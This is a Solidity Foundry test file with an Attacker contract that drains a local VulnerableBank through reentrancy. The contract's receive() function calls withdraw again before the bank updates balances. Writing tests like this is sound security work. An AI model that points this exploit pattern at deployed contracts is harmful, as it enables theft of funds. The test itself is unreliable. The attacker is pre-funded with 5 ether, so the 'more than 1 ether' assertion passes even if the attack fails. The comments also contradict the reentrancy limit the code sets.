// SPDX-License-Identifier: MIT
pragma solidity ^0.7.0;
pragma abicoder v2; // Enable ABI coder v2

import "forge-std/Test.sol";
import "./VulnerableBank.sol";

contract Attacker {
    VulnerableBank public bank;
    uint public reentrantCalls = 0;
    uint public maxReentrantCalls = 2; // Allow only one reentrant call

    constructor(VulnerableBank _bank) {
        bank = _bank;
    }

    receive() external payable {
        if (reentrantCalls < maxReentrantCalls) {
            reentrantCalls++;
            bank.withdraw(1 ether); // Only one reentrant withdrawal
        }
    }

    function attack() external payable {
        bank.deposit{value: msg.value}();
        bank.withdraw(1 ether); // Initiates the attack
    }

    function getBalance() public view returns (uint) {
        return address(this).balance;
    }
}

contract ReentrancyTest is Test {
    VulnerableBank public bank;
    Attacker public attacker;

    function setUp() public {
        bank = new VulnerableBank();
        attacker = new Attacker(bank);

        // Provide sufficient Ether to the bank and the attacker
        vm.deal(address(bank), 10 ether);
        vm.deal(address(attacker), 5 ether);

        // Ensure the test account has enough Ether
        vm.deal(address(this), 10 ether);
    }

    function testReentrancyAttack() public {
        // Deposit 1 Ether into the bank by the attacker
        attacker.attack{value: 1 ether}();

        // Check if the attacker was able to withdraw more than what was deposited
        assertTrue(attacker.getBalance() > 1 ether, "Attacker should have more than 1 Ether");
    }
}
